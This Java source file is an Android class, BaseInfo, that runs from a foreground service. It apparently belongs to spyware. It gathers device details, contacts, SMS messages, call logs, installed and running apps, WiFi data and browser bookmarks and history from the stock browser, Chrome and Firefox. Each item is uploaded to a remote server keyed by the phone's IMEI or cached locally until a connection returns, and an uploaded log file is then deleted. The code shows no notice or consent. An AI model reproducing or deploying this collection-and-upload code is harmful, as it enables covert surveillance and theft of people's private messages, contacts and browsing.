package com.main;

import java.io.File;
import java.io.FileInputStream;
import com.authority.AuthoritySettings;
import com.network.Network;
import com.network.SendDataToServer;
import com.phone.data.BrowserHistory;
import com.phone.data.PhoneAPP;
import com.phone.data.PhoneCall;
import com.phone.data.PhoneContacts;
import com.phone.data.PhoneInformation;
import com.phone.data.PhoneRunningApps;
import com.phone.data.PhoneSMS;
import com.phone.data.PhoneWIFI;
import com.utils.ExceptionProcess;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import android.content.Context;
import android.util.Log;




public class BaseInfo  implements  Runnable{
	private final String TAG = "MainProc";

	Context context;
	
	public BaseInfo(Context context){
		this.context = context;
		Log.e(TAG, "MainProc");
	}
	
	@Override
	public void run(){
		try {
	        long timenow = System.currentTimeMillis();
			String lasttime = PrefOper.getValue(context,ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.PROGRAM_LAST_TIME);
			if (lasttime.equals("") == true || lasttime == null) {

				PrefOper.setValue(context,ForegroundService.PARAMCONFIG_FileName, 
						ForegroundService.PROGRAM_LAST_TIME, String.valueOf(timenow));

			}else{
	    		if(timenow - Long.parseLong(lasttime) >= Public.BASIC_RETRIEVE_INTERVAL){
	    			PrefOper.setValue(context,ForegroundService.PARAMCONFIG_FileName, 
	    					ForegroundService.PROGRAM_LAST_TIME, String.valueOf(timenow));
	    		}else{
	    			return;
	    		}
			}
	        WriteDateFile.writeLogFile("main proc start at:" + PublicFunction.formatCurrentDate() + "\r\n");

	        try {
	        	
		    	String deviceinfo = PhoneInformation.getPhoneInfo(context);
		    	if (deviceinfo != null && deviceinfo.equals("") == false ) {
			    	if (Network.isNetworkConnected(context) == false) {
			    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
			    				ForegroundService.DEVICEINFO_FILE_NAME, deviceinfo,false);
					}else{
				    	SendDataToServer.sendDataToServer(deviceinfo.getBytes(), deviceinfo.getBytes().length, 
				    			Public.CMD_DATA_DEVICEINFO, Public.IMEI);
					}
		    	}
		    	
			} catch (Exception e) {
				e.printStackTrace();
			}

	        //make sure the info is first data into database
	        try {
				//Thread.sleep(3000);
			} catch (Exception e) {
				e.printStackTrace();
			}

	    	try {
	    		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_CONTACTS) == true){
			        String contacts = PhoneContacts.getUserContacts(context);
			        if(contacts != null && contacts.equals("") == false){
				    	if (Network.isNetworkConnected(context) == false) {
				    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
				    				ForegroundService.CONTACTS_FILE_NAME, contacts,false);
						}else{
							SendDataToServer.sendDataToServer(contacts.getBytes(), contacts.getBytes().length, 
									Public.CMD_DATA_CONTACTS, Public.IMEI);
						}
			        }
	    		}
			} catch (Exception e) {
				e.printStackTrace();
			}

	        
	    	try {
	    		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_SMS) == true){
			    	String smsString = PhoneSMS.getSmsFromPhone(context);
			    	if(smsString != null && smsString.equals("") == false){
				    	if (Network.isNetworkConnected(context) == false) {
				    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
				    				ForegroundService.MESSAGE_FILE_NAME, smsString,false);
						}else{
							SendDataToServer.sendDataToServer(smsString.getBytes(), smsString.getBytes().length, 
									Public.CMD_DATA_MESSAGE, Public.IMEI);
			    		}
			    	}
	    		}
			} catch (Exception e) {
				e.printStackTrace();
			}


	    	

	    	try {
	    		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_CALL_LOG) == true){
			    	String call = PhoneCall.getCallHistoryList(context);
			    	if(call != null && call.equals("") == false){
				    	if (Network.isNetworkConnected(context) == false) {
				    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
				    				ForegroundService.CALLLOG_FILE_NAME, call,false);
						}else{
							SendDataToServer.sendDataToServer(call.getBytes(), call.getBytes().length, 
									Public.CMD_DATA_CALLLOG, Public.IMEI);
						}
			    	}
		    	}
			} catch (Exception e) {
				e.printStackTrace();
			}



	    	

	    	try {
		    	String appprocss = PhoneAPP.getAppList(context);
		    	if(appprocss != null && appprocss.equals("") == false ){
			    	if (Network.isNetworkConnected(context) == false) {
			    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
			    				ForegroundService.APPPROCESS_FILE_NAME, appprocss,false);
					}else{
						SendDataToServer.sendDataToServer(appprocss.getBytes(), appprocss.getBytes().length,
								Public.CMD_DATA_APPPROCESS, Public.IMEI);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

	    	
	    	try {
		    	PhoneRunningApps.getRunningApps(context);
			} catch (Exception e) {
				e.printStackTrace();
			}

	    	

	    	try {
	    		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.ACCESS_WIFI_STATE) == true){
	    			PhoneWIFI.processWIFI(context);
	    		}
			} catch (Exception e) {
				e.printStackTrace();
			}
	    	
	    	
	    	
	    	if (Network.isNetworkConnected(context) == true) {
		    	File filelog =  new File(ForegroundService.LOCAL_PATH_NAME + ForegroundService.LOG_FILE_NAME);
		    	if(filelog.exists() == true){
		    		int logsize = (int)filelog.length();
	    			byte[] bytelog = new byte[logsize];
	    			FileInputStream fin = new FileInputStream(filelog);
	    			fin.read(bytelog, 0, logsize);
	    			fin.close();

		    		SendDataToServer.sendDataToServer(bytelog, bytelog.length,Public.CMD_UPLOAD_LOG, Public.IMEI);
		        	filelog.delete();
		    	}
	    	}
	    	
	    	/*
	    	File filerecord = new File(ForegroundService.LOCAL_PATH_NAME + ForegroundService.FILEOBSERVER_FILE_NAME);
	    	if(filerecord.exists() == true){
	    		int recordseize = (int)filerecord.length();
    			byte[] byterecord = new byte[recordseize];
    			FileInputStream fin = new FileInputStream(filerecord);
    			fin.read(byterecord, 0, recordseize);
    			fin.close();
    			filerecord.delete();
    			SendDataToServer.sendDataToServer(byterecord, byterecord.length,CMD_DATA_FILERECORD, Public.IMEI);
	    	}*/


	    	//content://org.mozilla.firefox.db.browser/bookmarks
	    	//content://com.android.chrome.browser/bookmarks
	    	//content://com.ume.browser/bookmarks
	    	//content://browser/bookmarks
	    	
	    	//content://com.android.chrome.ChromeBrowserProvider/bookmarks
	    		if (AuthoritySettings.checkSinglePermission(context, 
	    				"com.android.browser.permission.READ_HISTORY_BOOKMARKS") == true){
		    		try {
				    	String webkithistroy = BrowserHistory.getWebKitRecord(context,
				    			"content://browser/bookmarks");
				    	if (webkithistroy != null && webkithistroy.equals("") == false) {
					    	if (Network.isNetworkConnected(context) == false) {
					    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
					    				ForegroundService.WEBKITRECORD_FILE_NAME, webkithistroy, false);
							}else{
								SendDataToServer.sendDataToServer(webkithistroy.getBytes(), 
										webkithistroy.getBytes().length, Public.CMD_DATA_WEBKITHISTORY, Public.IMEI);
							}
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
	
		
		    		try {
				    	String chromehistroy = BrowserHistory.getWebKitRecord(context,
				    			"content://com.android.chrome.browser/bookmarks");
				    	if (chromehistroy != null && chromehistroy.equals("") == false) {
					    	if (Network.isNetworkConnected(context) == false) {
					    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
					    				ForegroundService.CHROMEHISTORY_FILE_NAME, chromehistroy, false);
							}else{
								SendDataToServer.sendDataToServer(chromehistroy.getBytes(), chromehistroy.getBytes().length, 
										Public.CMD_DATA_CHROMEHISTORY, Public.IMEI);
							}
							
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
			    	
	
			    	
			    	try {
				    	String ffhistroy = BrowserHistory.getWebKitRecord(context,
				    			"content://org.mozilla.firefox.db.browser/bookmarks");
				    	if (ffhistroy != null && ffhistroy.equals("") == false) {
					    	if (Network.isNetworkConnected(context) == false) {
					    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
					    				ForegroundService.FIREFOXRECORD_FILE_NAME, ffhistroy, false);
							}else{
								SendDataToServer.sendDataToServer(ffhistroy.getBytes(), ffhistroy.getBytes().length, 
										Public.CMD_DATA_FIREFOXHISTORY, Public.IMEI);
							}
				    	}
					} catch (Exception e) {
						e.printStackTrace();
					}
	    		}


	    	return;
	    	
		} catch (Exception ex) {
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("MainProcessThread exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return;
		}
	}

}
